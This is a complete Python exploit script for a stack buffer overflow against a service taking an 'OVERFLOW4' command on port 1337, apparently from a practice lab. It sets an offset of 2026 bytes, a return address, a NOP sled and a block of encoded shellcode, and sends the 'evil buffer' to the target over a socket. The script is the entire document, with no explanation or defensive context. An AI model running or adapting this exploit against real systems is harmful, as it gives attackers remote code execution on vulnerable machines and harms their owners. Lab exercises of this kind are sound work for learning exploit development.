#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbe\x2e\xf9\x3a\x11\xda\xcb\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x77\x12\x03\x77\x12\x83\xe9\xfd\xd8\xe4\x09\x15\x9e"
"\x07\xf1\xe6\xff\x8e\x14\xd7\x3f\xf4\x5d\x48\xf0\x7e\x33\x65"
"\x7b\xd2\xa7\xfe\x09\xfb\xc8\xb7\xa4\xdd\xe7\x48\x94\x1e\x66"
"\xcb\xe7\x72\x48\xf2\x27\x87\x89\x33\x55\x6a\xdb\xec\x11\xd9"
"\xcb\x99\x6c\xe2\x60\xd1\x61\x62\x95\xa2\x80\x43\x08\xb8\xda"
"\x43\xab\x6d\x57\xca\xb3\x72\x52\x84\x48\x40\x28\x17\x98\x98"
"\xd1\xb4\xe5\x14\x20\xc4\x22\x92\xdb\xb3\x5a\xe0\x66\xc4\x99"
"\x9a\xbc\x41\x39\x3c\x36\xf1\xe5\xbc\x9b\x64\x6e\xb2\x50\xe2"
"\x28\xd7\x67\x27\x43\xe3\xec\xc6\x83\x65\xb6\xec\x07\x2d\x6c"
"\x8c\x1e\x8b\xc3\xb1\x40\x74\xbb\x17\x0b\x99\xa8\x25\x56\xf6"
"\x1d\x04\x68\x06\x0a\x1f\x1b\x34\x95\x8b\xb3\x74\x5e\x12\x44"
"\x7a\x75\xe2\xda\x85\x76\x13\xf3\x41\x22\x43\x6b\x63\x4b\x08"
"\x6b\x8c\x9e\x9f\x3b\x22\x71\x60\xeb\x82\x21\x08\xe1\x0c\x1d"
"\x28\x0a\xc7\x36\xc3\xf1\x80\x32\x12\xe4\xc5\x2b\x18\x16\xf7"
"\xf7\x95\xf0\x9d\x17\xf0\xab\x09\x81\x59\x27\xab\x4e\x74\x42"
"\xeb\xc5\x7b\xb3\xa2\x2d\xf1\xa7\x53\xde\x4c\x95\xf2\xe1\x7a"
"\xb1\x99\x70\xe1\x41\xd7\x68\xbe\x16\xb0\x5f\xb7\xf2\x2c\xf9"
"\x61\xe0\xac\x9f\x4a\xa0\x6a\x5c\x54\x29\xfe\xd8\x72\x39\xc6"
"\xe1\x3e\x6d\x96\xb7\xe8\xdb\x50\x6e\x5b\xb5\x0a\xdd\x35\x51"
"\xca\x2d\x86\x27\xd3\x7b\x70\xc7\x62\xd2\xc5\xf8\x4b\xb2\xc1"
"\x81\xb1\x22\x2d\x58\x72\x42\xcc\x48\x8f\xeb\x49\x19\x32\x76"
"\x6a\xf4\x71\x8f\xe9\xfc\x09\x74\xf1\x75\x0f\x30\xb5\x66\x7d"
"\x29\x50\x88\xd2\x4a\x71")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
